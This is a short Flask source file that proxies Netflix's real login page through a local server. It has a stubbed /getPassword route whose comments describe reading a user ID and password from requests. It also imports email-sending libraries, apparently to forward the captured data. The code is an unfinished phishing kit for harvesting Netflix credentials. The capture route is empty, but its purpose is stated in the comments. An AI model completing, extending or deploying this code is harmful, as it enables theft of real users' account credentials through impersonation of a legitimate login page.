from flask import Flask, jsonify, Response, request, send_from_directory, render_template, redirect
from flask_cors import CORS
import requests
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

app = Flask(__name__)
CORS(app)

target_url = "https://www.netflix.com/Login"

@app.route('/', methods=['GET', 'POST'])
def serve_index():
    return render_template('index.html')

@app.route('/proxy')
def proxy():
    response = requests.get(target_url)
    return Response(response.text, status=response.status_code, content_type=response.headers['content-type'])

# Create /getPassword route with    

def get_password():
    # # Get user_id and user_password using the request.args.get() method
    

    # Print("Getting password")
    

    # Redirect to "/"
    
    pass

    
if __name__ == '__main__':
    app.run(port=5000)
